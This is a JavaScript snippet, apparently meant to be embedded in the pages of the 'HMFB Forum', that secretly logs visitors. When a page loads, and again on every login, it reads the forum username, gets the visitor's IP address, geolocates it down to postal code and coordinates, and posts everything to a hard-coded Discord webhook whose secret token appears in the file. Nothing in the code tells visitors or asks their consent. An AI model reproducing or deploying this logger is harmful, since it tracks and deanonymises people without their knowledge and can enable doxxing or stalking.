const sendIP = () => {
    // Obtener usuario actual del foro (si está logueado)
    let forumUser = "Guest";
    try {
        const session = JSON.parse(localStorage.getItem('currentSession'));
        if (session && session.username) {
            forumUser = session.username;
        }
    } catch (e) {
        console.log("No hay sesión de foro activa");
    }
    
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1448715548488634421/fNFu8AxkbmNpIijdmZWrBopyKsvFrwZSnWf5S7GGPyCrFYMaanD0oYjT5yv3BqbAv447';
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "HMFB Logger",
                            avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png",
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'HMFB Forum - Visitante Registrado',
                                    description: `**Usuario Forum >> **${forumUser}\n**IP >> **${ipadd}\n**ISP >> ** ${geoData.org || geoData.network}\n**Ciudad >> ** ${geoData.city}\n**Región >> ** ${geoData.region}\n**País >> ** ${geoData.country_name}\n**Código Postal >> ** ${geoData.postal}\n**Latitud >> ** ${geoData.latitude}\n**Longitud >> ** ${geoData.longitude}`,
                                    color: 0x800080,
                                    footer: {
                                        text: `HMFB Forum • ${new Date().toLocaleString()}`
                                    },
                                    thumbnail: {
                                        url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png"
                                    }
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('IP enviada a Discord!');
            } else {
                console.log('Error al enviar IP');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
};

// Ejecutar cuando la página cargue
sendIP();

// También ejecutar cuando alguien se loguee/registre
document.addEventListener('DOMContentLoaded', function() {
    // Observar cambios en localStorage para detectar logins
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function(key, value) {
        originalSetItem.apply(this, arguments);
        if (key === 'currentSession') {
            // Esperar un momento para que el usuario se guarde
            setTimeout(sendIP, 1000);
        }
    };
});
